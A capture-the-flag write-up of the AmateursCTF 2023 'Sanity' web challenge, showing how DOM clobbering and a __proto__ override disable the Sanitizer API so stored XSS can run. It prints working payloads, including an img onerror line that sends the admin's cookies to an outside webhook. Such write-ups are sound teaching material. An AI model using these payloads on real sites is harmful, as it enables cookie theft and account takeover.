---
title: AmateursCTF 2023 - Sanity
date: '2023-07-25'
lastmod: '2023-07-25T21:21:41+02:00'
categories:
- writeup
- amtctf2023
tags:
- web
- xss
- DOM clobbering
authors:
- LoldemortXP
---

## Context
We're given a very simple website where we can write rants.

<img class="img-responsive" src="/amtctf2023/sanity-home.png" alt="Screenshot of Sanity's home page" width="541" height="229">

After posting our rant, we're redirected to its page, where its title, content and a report link are shown.

<img class="img-responsive" src="/amtctf2023/sanity-rant.png" alt="Screenshot of an example rant in Sanity" width="631" height="312">

We can see that the page accepts HTML. However, we can't just write *whatever* we want, because the input is sanitized by the client using the **Sanitizer API**.
Here's the code of the rant page:

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>sanity - TRX%20is%20the%20%3Cb%3Ebest%3C%2Fb%3E</title>
</head>

<body>
    <h1 id="title">
        <script>
            const sanitizer = new Sanitizer();
            document.getElementById("title").setHTML(decodeURIComponent(`TRX%20is%20the%20%3Cb%3Ebest%3C%2Fb%3E`), { sanitizer });
        </script>
    </h1>
    <div id="paste">
        <script>
            class Debug {
                #sanitize;
                constructor(sanitize = true) {
                    this.#sanitize = sanitize
                }

                get sanitize() {
                    return this.#sanitize;
                }
            }

            async function loadBody() {
                let extension = null;
                if (window.debug?.extension) {
                    let res = await fetch(window.debug?.extension.toString());
                    extension = await res.json();
                }

                const debug = Object.assign(new Debug(true), extension ?? { report: true });
                let body = decodeURIComponent(`Reasons%3A%0A[...redacted]`);
                if (debug.report) {
                    const reportLink = document.createElement("a");
                    reportLink.innerHTML = `Report iowgxi0XbHQrG2pPUoiqd`;
                    reportLink.href = `report/iowgxi0XbHQrG2pPUoiqd`;
                    reportLink.style.marginTop = "1rem";
                    reportLink.style.display = "block"

                    document.body.appendChild(reportLink)
                }

                if (debug.sanitize) {
                    document.getElementById("paste").setHTML(body, { sanitizer })
                } else {
                    document.getElementById("paste").innerHTML = body
                }
            }

            loadBody();
        </script>
    </div>
</body>

</html>
```

The Sanitizer API is relatively recent, having been introduced between 2020 and 2021, and is a pretty solid way of preventing XSS: it won't allow any JS code to be injected into the page. We can't get around that.

What we can see, however, is that while the title is always sanitized, the content is sanitized only if the `Debug` class instructs to do so. The script will also check if `window.debug.extension` exists, **after** rendering the title, and will eventually load `Debug`'s configuration from the URL specified in there. If we're able to inject that URL, we can disable sanitization. How?

## DOM Clobbering's magic
There's a very nice technique to create objects inside `window` only using HTML: tags with an `id` attribute (`name` also works with some tags) will automatically be made available inside the `window` object by the browser. For example, `<img id='a' />` will result in `window.a` being a reference to the image:

<img class="img-responsive" src="/amtctf2023/sanity-example.png" alt="Basic example of DOM clobbering" width="350" height="122">

This doesn't apply to all tags. Most notably, it applies to links, images, forms, iframes and objects.

A very useful consequence of this behaviour is that we can inject strings: calling `toString()` on a link will return its `href` attribute, and that's exactly what we need. For this challenge, however, we need to create a string *inside an object*.

There are ways to clobber *deeper than one level*. One such way is to use form inputs, because they're accessible from the parent form object. For example,

```html
<form name='a'>
    <input name='b' />
</form>
```

would let us access the input using `window.a.b`. Other ways include nesting iframes and other objects, but it may be impossible to do so when dealing with sanitizers.

So it should be easy, right? We could try to put a link inside a link, or a link inside a form... but it's not as straightforward as it seems. Let's try it locally:

<img class="img-responsive" src="/amtctf2023/sanity-test1.png" alt="Failed test of two-level clobbering" width="728" height="116">

<img class="img-responsive" src="/amtctf2023/sanity-test2.png" alt="Another failed test of two-level clobbering" width="661" height="116">

What's happening?

Expect for inputs, objects can actually be referenced with their ID or name only from `window` directly, which makes sense. Can we get around that?

I got stuck here for a while, but as it turns out, we can. The key is having **multiple objects with the same ID**. While semantically incorrect, the JS engine will not ignore them, and will kindly put them in a collection for us; at that point, we can access a single object either by its array index or by its name, which will hopefully be unique.

<img class="img-responsive" src="/amtctf2023/sanity-test3.png" alt="Successful test of two-level clobbering" width="661" height="116">

Success!

## Finalizing the payload
I spent a lot of time here, because my webhook address made the payload too long, and most free webhooks available online don't allow enabling CORS headers, which are needed to make a successful cross-site fetch.

In the end, I settled for this title:
```html
<a id="debug"><a id="debug" name="extension" href="//redacted.m.pipedream.net"></a></a>
```
The Pipedream webhook would then send the header `Access-Control-Allow-Origin: *`, and a very simple JSON object:
```json
{"report":true,"__proto__":{"sanitize":false}}
```

Why did I put `sanitize` inside `__proto__`? That was the only way I found to override a private property without a setter, as trying to inject `sanitize` directly would result in the error `TypeError: Cannot set property sanitize of #<Debug> which has only a getter`.

Once sanitization is disabled, the challenge becomes a simple XSS. My rant's content:
```html
<img src="/" onerror="window.location='https://webhook.site/redacted/?'+document.cookie" />
```

Putting everything together, we find that the admin's cookie `flag` contained `amateursCTF{s@nit1zer_ap1_pr3tty_go0d_but_not_p3rf3ct}`.

## Thoughts
Before this challenge I only knew the idea behind DOM clobbering and had never tried it. The solution was very short in the end, but I needed a lot of research to get to it. I found it fun and educational, and that's why I decided to make a writeup. :)
